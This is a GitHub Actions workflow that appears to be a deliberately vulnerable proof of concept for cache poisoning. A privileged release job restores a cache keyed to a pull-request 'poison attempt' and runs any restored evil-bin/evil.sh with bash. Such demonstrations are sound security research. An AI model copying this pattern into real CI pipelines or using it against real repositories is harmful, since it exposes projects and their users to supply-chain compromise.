name: release
on:
  push:
    tags: ['v[0-9]+.[0-9]+.[0-9]+']
  workflow_run:
    workflows: ["Prepare Release"]
    types: [completed]
jobs:
  goreleaser:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: context
        run: |
          echo "REF=${{ github.ref }}"
          echo "CACHE_TOKEN_MODE probe below"
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: Cache goreleaser (same key as PR poison attempt)
        id: cache-goreleaser
        uses: actions/cache@v3
        with:
          path: evil-bin
          key: POC-CACHE-KEY
      - name: Would execute cached binary
        run: |
          echo "cache-hit=${{ steps.cache-goreleaser.outputs.cache-hit }}"
          ls -la evil-bin || true
          if [ -f evil-bin/evil.sh ]; then echo "=== RESTORED, EXECUTING ==="; bash evil-bin/evil.sh; else echo "NOT_RESTORED"; fi
